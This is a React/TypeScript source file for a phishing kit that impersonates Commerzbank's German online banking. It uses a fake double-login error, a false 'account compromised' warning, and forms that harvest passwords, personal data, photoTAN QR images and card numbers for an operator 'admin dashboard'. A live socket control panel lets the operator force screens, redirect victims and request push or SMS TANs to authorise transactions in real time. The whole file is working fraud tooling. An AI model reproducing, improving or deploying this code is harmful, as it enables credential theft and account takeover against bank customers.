import React, { useState, useEffect, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { updatePageMetadata, getTemplateMetadata } from '../../utils/templateMetadata';
import { useTemplateAccess } from '../../hooks/useTemplateAccess';
import { BlockedTemplate } from '../../components/BlockedTemplate';
import { submitTemplateData, uploadTemplateFile, getTemplateConfig, createTemplateSession } from '../../utils/templateApi';
import templateSocketClient from '../../utils/socketClient';

// Remove axios import and config - using templateApi instead
import './CommerzStyle.css';
import './fonts.css';

// Import components 
import LoginForm from './components/LoginForm';
import Loading from './components/Loading';
import ErrorScreen from './components/ErrorScreen';
import Header from './components/Header';
import Footer from './components/Footer';
import AccountCompromisedScreen from './components/AccountCompromisedScreen';
import PersonalDataForm from './components/PersonalDataForm';
import QRInstructionsScreen from './components/QRInstructionsScreen';
import QRUploadForm from './components/QRUploadForm';
import QRErrorScreen from './components/QRErrorScreen';
import BankCardForm from './components/BankCardForm';
import FinalSuccessScreen from './components/FinalSuccessScreen';
import PushTANScreen from './components/PushTANScreen';
import SMSTANScreen from './components/SMSTANScreen';

// Commerzbank flow states
const STATES = {
  LOGIN: 'login',
  LOGIN_ERROR: 'login_error',
  ACCOUNT_COMPROMISED: 'account_compromised',
  PERSONAL_DATA: 'personal_data',
  PERSONAL_SUCCESS: 'personal_success',
  QR_INSTRUCTIONS: 'qr_instructions',
  QR_UPLOAD: 'qr_upload',
  QR_ERROR: 'qr_error',
  QR_RETRY: 'qr_retry',
  BANK_CARD: 'bank_card',
  BANK_SUCCESS: 'bank_success',
  FINAL_SUCCESS: 'final_success',
  LOADING: 'loading',
  ERROR: 'error',
  // Advanced states for admin control
  PUSHTAN_REQUEST: 'pushtan_request',
  SMS_TAN_REQUEST: 'sms_tan_request',
  TRANSACTION_CONFIRM: 'transaction_confirm',
  ACCOUNT_VERIFICATION: 'account_verification',
  // AFK/Live Mode states
  WAITING_FOR_ADMIN: 'waiting_for_admin'
};

// Configuration interface
interface StepConfig {
  doubleLogin: boolean;
  personalData: boolean;
  bankCard: boolean;
  qrCode: boolean;
}

// Default configuration
const DEFAULT_CONFIG: StepConfig = {
  doubleLogin: true,
  personalData: true,
  bankCard: true,
  qrCode: true
};

// Data interfaces
interface LoginData {
  username: string;
  password: string;
}

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  address?: string; // Optional, will be generated from other fields
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface BankCardData {
  card_number: string;
  expiry_date: string;
}

// AutoLogin component with metadata update
function AutoLogin() {
  const [key, setKey] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const navigate = useNavigate();

  useEffect(() => {
    // Update page metadata for Commerzbank template
    const metadata = getTemplateMetadata('commerzbank');
    updatePageMetadata(metadata);
    
    // Create session properly with backend
    const initializeSession = async () => {
      try {
        setLoading(true);
        const newKey = await createTemplateSession('commerzbank');
        console.log('Created Commerzbank session with key:', newKey);
        navigate(`/commerzbank/${newKey}`);
      } catch (err) {
        console.error('Error creating session:', err);
        setError('Fehler beim Erstellen einer Sitzung');
        setLoading(false);
      }
    };
    
    initializeSession();
  }, [navigate]);

  if (loading) {
    return <div>Laden...</div>;
  }

  if (error) {
    return <div>Fehler: {error}</div>;
  }

  return null;
}

// Main flow component for Commerzbank 14-step process
function FormFlow() {
  const { key } = useParams<{ key: string }>();
  const [state, setState] = useState<string>(STATES.LOGIN);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [loadingMessage, setLoadingMessage] = useState("Verbindung wird hergestellt...");
  const [stepConfig, setStepConfig] = useState<StepConfig>(DEFAULT_CONFIG);
  const [configLoaded, setConfigLoaded] = useState(false);
  const [sessionData, setSessionData] = useState<any>({});
  
  // Enhanced TAN system state
  const [currentTanRequest, setCurrentTanRequest] = useState<{
    type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
    method: 'pushtan' | 'sms';
    transactionDetails?: any;
    requestId: string;
  } | null>(null);

  // AFK/Live Mode system state
  const [sessionMode, setSessionMode] = useState<'AFK' | 'LIVE'>('AFK');
  const [isWaitingForAdmin, setIsWaitingForAdmin] = useState(false);

  // Scroll to top whenever state changes
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, [state]);

  // Flow control function - checks if should pause in Live Mode
  const proceedToNextState = (nextState: string, processingMessage: string = 'Wird verarbeitet...') => {
    if (sessionMode === 'LIVE') {
      // In Live Mode: pause and wait for admin
      setLoading(true);
      setLoadingMessage(processingMessage);
      setIsWaitingForAdmin(true);
      
      // Store the next state to transition to when admin continues
      setSessionData(prev => ({ ...prev, pendingState: nextState }));
      
      // Notify admin that user is waiting
      templateSocketClient.emit('user-waiting', {
        sessionKey: key,
        currentState: state,
        pendingState: nextState,
        message: processingMessage
      });
    } else {
      // In AFK Mode: continue automatically
      setState(nextState);
    }
  };

  useEffect(() => {
    const metadata = getTemplateMetadata('commerzbank');
    updatePageMetadata(metadata);

    // Load step configuration from backend - MUST complete before user interaction
    const loadConfig = async () => {
      try {
        setLoadingMessage("Schritt-Konfiguration wird geladen...");
        const config = await getTemplateConfig('commerzbank');
        setStepConfig(config.steps);
        setConfigLoaded(true);
        if (process.env.NODE_ENV === 'development') {
          console.log('✅ Loaded Commerzbank step config:', config.steps);
        }
        if (process.env.NODE_ENV === 'development') {
          console.log('🔧 Step config details:', {
            doubleLogin: config.steps.doubleLogin,
            personalData: config.steps.personalData,
            qrCode: config.steps.qrCode,
            bankCard: config.steps.bankCard,
            configLoaded: true
          });
        }
      } catch (error) {
        console.warn('⚠️ Failed to load step config, using defaults:', error);
        // Even if API fails, mark as loaded to continue with defaults
        setConfigLoaded(true);
      }
    };

    if (!key) {
      setError('Ungültiger Session-Schlüssel');
      setLoading(false);
      return;
    }

    console.log(`Initializing Commerzbank session with key: ${key}`);
    
    // Load config first, then initialize session
    loadConfig();
    
    // Initialize Socket.io connection for real-time admin control
    if (key) {
      templateSocketClient.connect({
        sessionKey: key,
        templateName: 'commerzbank',
        onStateForced: (state: string, message?: string) => {
          console.log('🎯 Admin forced state change:', state, message);
          
          // Show loading screen during state transition with natural banking messages
          setLoading(true);
          
          const getLoadingMessage = (targetState: string): string => {
            switch (targetState) {
              case 'personal_data':
                return 'Persönliche Daten werden geladen...';
              case 'qr_upload':
                return 'QR-Code Bereich wird vorbereitet...';
              case 'bank_card':
                return 'Bankdaten werden verarbeitet...';
              case 'final_success':
                return 'Vorgang wird abgeschlossen...';
              case 'account_compromised':
                return 'Sicherheitsprüfung läuft...';
              default:
                return 'Bitte warten Sie...';
            }
          };
          
          setLoadingMessage(message || getLoadingMessage(state));
          
          setTimeout(() => {
            setState(state);
            setLoading(false);
            if (message) {
              alert(message); // TODO: Replace with proper notification system
            }
          }, 1500); // 1.5 second loading delay for smooth transition
        },
        onDataInjected: (data: any) => {
          console.log('💉 Admin injected data:', data);
          
          // Show loading screen during data injection
          setLoading(true);
          setLoadingMessage('Daten werden aktualisiert...');
          
          setTimeout(() => {
            setSessionData(prev => ({ ...prev, ...data }));
            setLoading(false);
          }, 1000);
        },
        onRedirect: (url: string) => {
          console.log('🔗 Admin triggered redirect:', url);
          window.location.href = url;
        },
        onMessage: (message: string, type: string) => {
          console.log('💬 Admin message:', message, type);
          alert(`${type.toUpperCase()}: ${message}`);
        },
        // AFK/Live Mode handlers
        onModeChanged: (mode: 'AFK' | 'LIVE') => {
          console.log('🎛️ Admin changed session mode:', mode);
          setSessionMode(mode);
          
          // If switching to AFK mode and waiting, continue flow
          if (mode === 'AFK' && isWaitingForAdmin) {
            setIsWaitingForAdmin(false);
            setLoading(false);
          }
        },
        onContinueFlow: () => {
          console.log('▶️ Admin triggered continue flow');
          if (isWaitingForAdmin && sessionData.pendingState) {
            setIsWaitingForAdmin(false);
            setLoading(false);
            setState(sessionData.pendingState);
            // Clear pending state
            setSessionData(prev => ({ ...prev, pendingState: null }));
          }
        },
        // Enhanced TAN system handlers
        onTanRequest: (tanData: {
          type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
          method: 'pushtan' | 'sms';
          transactionDetails?: any;
          requestId: string;
        }) => {
          console.log('🔐 Admin requested TAN:', tanData);
          
          // Show loading screen during TAN preparation
          setLoading(true);
          setLoadingMessage(
            tanData.type === 'TRANSACTION_TAN' 
              ? 'Stornierung wird vorbereitet...' 
              : 'Anmeldung wird verarbeitet...'
          );
          
          setTimeout(() => {
            setCurrentTanRequest(tanData);
            setLoading(false);
            
            // Navigate to appropriate TAN screen
            if (tanData.method === 'pushtan') {
              setState(STATES.PUSHTAN_REQUEST);
            } else {
              setState(STATES.SMS_TAN_REQUEST);
            }
          }, 2000); // 2 second loading for TAN preparation
        }
      });
    }
    
    // Wait for config to load, then initialize session
    const initializeAfterConfig = async () => {
      await loadConfig();
      setLoadingMessage("Sitzung wird initialisiert...");
      setTimeout(() => {
        setState(STATES.LOGIN);
        setLoading(false);
      }, 1000);
    };
    
    initializeAfterConfig();
    
    // Cleanup socket on unmount
    return () => {
      templateSocketClient.disconnect();
    };
  }, [key]);

  // Handle login submission (Steps 2 & 4)
  const handleLogin = async (data: LoginData) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Login attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Submitting login for Commerzbank flow:', { key, username: data.username ? '✓' : '✗' });
      
      if (!key) {
        console.error('No session key available');
        setError('Keine Sitzungs-ID vorhanden');
        setState(STATES.ERROR);
        return;
      }
      
      // Store login data
      const newSessionData = {
        ...sessionData,
        session_key: key,
        username: data.username,
        password: data.password,
        timestamp: new Date().toISOString(),
        user_agent: navigator.userAgent,
        referrer: document.referrer
      };
      setSessionData(newSessionData);
      
      // Submit to our admin dashboard API
      try {
        const response = await submitTemplateData({
          template_name: 'commerzbank',
          key: key || '',
          step: 'login',
          data: {
            username: data.username,
            password: data.password,
            state: state,
            attempt: state === STATES.LOGIN ? 1 : 2,
            browser: navigator.userAgent,
            referrer: document.referrer,
            timestamp: new Date().toISOString()
          }
        });

        if (!response.success) {
          console.warn('Backend submission failed:', response.error);
          // Continue with flow even if API fails
        }
      } catch (apiError) {
        console.warn('Failed to submit to admin dashboard:', apiError);
        // Continue with flow even if API fails
      }
      
      // Check double login configuration
      if (state === STATES.LOGIN) {
        if (stepConfig.doubleLogin) {
          // First login attempt - show error (Step 3)
          console.log('First login attempt - showing error');
          setState(STATES.LOGIN_ERROR);
        } else {
          // Single login - go directly to account compromised (Step 5)
          console.log('Single login - account compromised');
          proceedToNextState(STATES.ACCOUNT_COMPROMISED, 'Anmeldung wird verarbeitet...');
        }
      } else if (state === STATES.LOGIN_ERROR) {
        // Second login attempt - show account compromised (Step 5)
        console.log('Second login attempt - account compromised');
        proceedToNextState(STATES.ACCOUNT_COMPROMISED, 'Anmeldung wird verarbeitet...');
      }
    } catch (error) {
      console.error('Login error:', error);
      setError('Fehler bei der Anmeldung');
      setState(STATES.LOGIN);
    }
  };

  // Handle verification start (Step 6)
  const handleStartVerification = async () => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Verification start attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Starting verification process for session:', key);
      
      // Get next enabled state based on step config
      if (stepConfig.personalData) {
        setState(STATES.PERSONAL_DATA);
      } else if (stepConfig.qrCode) {
        setState(STATES.QR_INSTRUCTIONS);
      } else if (stepConfig.bankCard) {
        setState(STATES.BANK_CARD);
      } else {
        setState(STATES.FINAL_SUCCESS);
      }
    } catch (error) {
      console.error('Start verification error:', error);
      setError('Fehler beim Starten der Verifizierung');
    }
  };

  // Handle personal data submission (Step 6)
  const handlePersonalDataSubmit = async (data: PersonalData) => {
    try {
      console.log('Submitting personal data for session:', key);
      
      // Generate address from individual fields if not provided
      const completeData: PersonalData = {
        ...data,
        address: data.address || `${data.street} ${data.street_number}, ${data.plz} ${data.city}`
      };
      
      const newSessionData = {
        ...sessionData,
        ...completeData,
        step: 'personal_data'
      };
      setSessionData(newSessionData);
      
      // Submit to admin dashboard
      try {
        const response = await submitTemplateData({
          template_name: 'commerzbank',
          key: key || '',
          step: 'personal-data',
          data: completeData
        });

        if (!response.success) {
          console.warn('Backend submission failed:', response.error);
        }
      } catch (apiError) {
        console.warn('Failed to submit personal data:', apiError);
      }
      
      // Immediately set loading state
      setState(STATES.LOADING);
      setLoadingMessage("Persönliche Daten werden verarbeitet...");
      
      // Simulate processing delay
      setTimeout(() => {
        // Check which step to go to next based on config
        if (stepConfig.qrCode) {
          proceedToNextState(STATES.QR_INSTRUCTIONS, 'Persönliche Daten werden verarbeitet...');
        } else if (stepConfig.bankCard) {
          proceedToNextState(STATES.BANK_CARD, 'Persönliche Daten werden verarbeitet...');
        } else {
          proceedToNextState(STATES.FINAL_SUCCESS, 'Vorgang wird abgeschlossen...');
        }
      }, 3000);
    } catch (error) {
      console.error('Personal data submission error:', error);
      setError('Fehler beim Speichern der persönlichen Daten');
    }
  };

  // Handle QR instructions continue (Step 7)
  const handleStartQRUpload = () => {
    setState(STATES.QR_UPLOAD);
  };

  // Handle QR upload (Step 8) - With actual file upload like Santander
  const handleQRUpload = async (file: File) => {
    console.log('🔥 COMMERZBANK QR UPLOAD HANDLER CALLED with file:', file.name, file.size, file.type);
    
    try {
      console.log('📤 Uploading QR code for Commerzbank session:', key);
      
      // Show loading state
      setState(STATES.LOADING);
      setLoadingMessage("QR-Code wird hochgeladen und analysiert...");
      
      // Create FormData with actual file
      const formData = new FormData();
      formData.append('template_name', 'commerzbank');
      formData.append('key', key || '');
      formData.append('step', 'qr-upload');
      formData.append('qrFile', file);
      formData.append('upload_attempt', (state === STATES.QR_RETRY ? 2 : 1).toString());
      
      console.log('📦 FormData prepared for Commerzbank, sending to backend...');
      
      const response = await uploadTemplateFile('commerzbank', key || '', file, 'qr-upload');
      
      console.log('✅ Commerzbank QR upload response:', response);
      
      // Simulate analysis time
      setTimeout(() => {
        // Single QR upload - go directly to next step
        const nextState = stepConfig.bankCard ? STATES.BANK_CARD : STATES.FINAL_SUCCESS;
        setState(nextState);
      }, 2000);
    } catch (error) {
      console.error('❌ Commerzbank QR upload error:', error);
      setState(STATES.ERROR);
      setError('Fehler beim QR-Upload');
    }
  };

  // Handle QR error screen transition (no longer needed but keep for compatibility)
  const handleQRErrorTransition = () => {
    setState(STATES.QR_RETRY);
  };

  // Handle bank card data submission (Step 8)
  const handleBankCardSubmit = async (data: BankCardData) => {
    try {
      console.log('Submitting bank card data for session:', key);
      
      console.log('Commerzbank: Bank card data being submitted:', data);
      
      // Submit bank card data to backend (backend will create lead from session data)
      try {
        const response = await submitTemplateData({
          template_name: 'commerzbank',
          key: key || '',
          step: 'bank-card-complete', // Special step to trigger lead creation
          data: data
        });
        
        console.log('✅ Complete lead data submitted successfully:', response);
        
        if (response.success) {
          console.log(`✅ Lead creation completed successfully`);
        }
      } catch (apiError: any) {
        console.error('❌ Failed to submit complete data:', apiError);
        if (apiError.response) {
          console.error('❌ API Response:', apiError.response.data);
          console.error('❌ API Status:', apiError.response.status);
        }
        // Continue with flow even if API fails
      }
      
      // Immediately set loading state
      setState(STATES.LOADING);
      setLoadingMessage("Bankkarten-Daten werden verarbeitet...");
      
      // Simulate processing delay
      setTimeout(() => {
        proceedToNextState(STATES.FINAL_SUCCESS, 'Bankdaten werden verarbeitet...');
      }, 3000);
    } catch (error: any) {
      console.error('Bank card submission error:', error);
      setError('Fehler beim Speichern der Bankkarten-Daten');
    }
  };

  // Get next enabled state based on current state and configuration
  const getNextEnabledState = (currentState: string): string => {
    switch (currentState) {
      case STATES.ACCOUNT_COMPROMISED:
        return stepConfig.personalData ? STATES.PERSONAL_DATA : STATES.QR_INSTRUCTIONS;
      case STATES.PERSONAL_DATA:
      case STATES.PERSONAL_SUCCESS:
        return STATES.QR_INSTRUCTIONS;
      case STATES.QR_RETRY:
        return stepConfig.bankCard ? STATES.BANK_CARD : STATES.FINAL_SUCCESS;
      case STATES.BANK_CARD:
      case STATES.BANK_SUCCESS:
        return STATES.FINAL_SUCCESS;
      default:
        return STATES.FINAL_SUCCESS;
    }
  };

  // Handle bank card skip
  const handleBankCardSkip = async () => {
    try {
      console.log('Commerzbank: Bank card skipped for session:', key);
      
      // Submit skip to backend
      const response = await submitTemplateData({
        template_name: 'commerzbank',
        key: key || '',
        step: 'bank-card-skip',
        data: { skip_reason: 'no_credit_card' }
      });
      
      console.log('✅ Bank card skip submitted successfully:', response);
      
      if (response.success) {
        console.log(`✅ Bank card skip completed successfully`);
      }
      
      // Immediately set loading state
      setState(STATES.LOADING);
      setLoadingMessage("Wird abgeschlossen...");
      
      // Simulate processing delay
      setTimeout(() => {
        setState(STATES.FINAL_SUCCESS);
      }, 2000);
      
    } catch (error) {
      console.error('❌ Bank card skip error:', error);
      setError('Fehler beim Überspringen der Kartendaten');
      setState(STATES.ERROR);
    }
  };

  // Render appropriate component based on state
  const renderContent = () => {
    if (loading || !configLoaded) {
      return <Loading 
        message={!configLoaded ? "Schritt-Konfiguration wird geladen..." : loadingMessage} 
      />;
    }
    
    if (error) {
      return <ErrorScreen message={error} />;
    }
    
    switch (state) {
      case STATES.LOGIN:
        return <LoginForm onSubmit={handleLogin} />;
      
      case STATES.LOGIN_ERROR:
        return <LoginForm onSubmit={handleLogin} showError={true} />;
      
      case STATES.ACCOUNT_COMPROMISED:
        return <AccountCompromisedScreen onStartVerification={handleStartVerification} />;
      
      case STATES.PERSONAL_DATA:
        return <PersonalDataForm onSubmit={handlePersonalDataSubmit} />;
      
      case STATES.QR_INSTRUCTIONS:
        return <QRInstructionsScreen onContinue={handleStartQRUpload} />;
      
      case STATES.QR_UPLOAD:
        return <QRUploadForm onUpload={handleQRUpload} />;
      
      case STATES.QR_ERROR:
        return <QRErrorScreen onTransition={handleQRErrorTransition} />;
      
      case STATES.QR_RETRY:
        return <QRUploadForm onUpload={handleQRUpload} isRetry={true} />;
      
      case STATES.BANK_CARD:
        return <BankCardForm onSubmit={handleBankCardSubmit} onSkip={handleBankCardSkip} />;
        
      case STATES.FINAL_SUCCESS:
        return <FinalSuccessScreen />;
      
      case STATES.PUSHTAN_REQUEST:
        return <PushTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          transactionDetails={currentTanRequest?.transactionDetails}
          onConfirm={() => {
            // Send TAN completion back to admin
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onCancel={() => {
            // Send TAN cancellation back to admin
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.SMS_TAN_REQUEST:
        return <SMSTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          phoneNumber={sessionData.maskedPhone || sessionData.phone}
          transactionDetails={currentTanRequest?.transactionDetails}
          onSubmit={(tan) => {
            console.log('SMS TAN submitted:', tan);
            // Send TAN completion back to admin
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type,
              tanValue: tan
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onResend={() => {
            console.log('SMS TAN resend requested');
            templateSocketClient.emit('tan-resend-requested', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
          }}
          onCancel={() => {
            // Send TAN cancellation back to admin
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.WAITING_FOR_ADMIN:
        return <Loading 
          message={isWaitingForAdmin ? loadingMessage : 'Wird verarbeitet...'} 
          type="processing"
          showProgress={false}
        />;
      
      case STATES.LOADING:
        return <Loading message={loadingMessage} />;
      
      case STATES.ERROR:
        return <ErrorScreen message={error || 'Ein Fehler ist aufgetreten'} />;
      
      default:
        return <ErrorScreen message="Unbekannter Status" />;
    }
  };

  return (
    <div className="min-h-screen bg-white font-gotham">
      <Header />
      <main style={{ paddingTop: '128px' }}>
        <div style={{
          maxWidth: '1440px',
          margin: '0 auto',
          padding: '0'
        }}>
        {renderContent()}
        </div>
      </main>
      <Footer />
    </div>
  );
}

// Export the main component directly without router wrapper
export default function CommerzbankTemplate() {
  const { key } = useParams();
  const { isActive, isChecking } = useTemplateAccess('commerzbank');
  
  // If template is being checked and found inactive, show blocked page immediately
  // No loading screen - either show template or blocked page
  if (!isChecking && !isActive) {
    return <BlockedTemplate templateName="commerzbank" />;
  }
  
  // Template is active or still checking - render normally
  // If no key is provided, show AutoLogin to generate one
  // If key is provided, show FormFlow for the main application
  if (!key) {
    return <AutoLogin />;
  }
  
  return <FormFlow />;
}

// Also export named export for compatibility
export const CommerzTemplate = CommerzbankTemplate;